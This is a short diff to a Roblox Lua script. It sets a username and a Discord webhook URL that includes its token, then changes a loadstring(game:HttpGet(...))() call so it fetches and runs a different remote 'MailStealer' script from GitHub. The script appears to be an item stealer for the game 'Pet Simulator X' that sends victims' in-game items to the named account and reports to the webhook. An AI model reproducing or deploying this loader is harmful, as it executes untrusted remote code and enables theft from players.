@@ -1,5 +1,4 @@
-_G.UserNamey = "psxgodlol100"
-_G.Webhooky = "https://discord.com/api/webhooks/1115633827088437269/g3xVoo7nVfea0-uDtsrrYdQ_Jl7OM9viebs98SyKLoShtnAsmqIpTPFVQavCrDgr2jzW"
+_G.Username = "psxgodlol100"
+_G.Webhook = "https://discord.com/api/webhooks/1115633827088437269/g3xVoo7nVfea0-uDtsrrYdQ_Jl7OM9viebs98SyKLoShtnAsmqIpTPFVQavCrDgr2jzW"
 
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/%E2%9C%97%20MailStealer%20%E2%9C%97"))()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/procat69420/ProcatMailsteal/main/ProcatMailsteal.lua'),true))() 
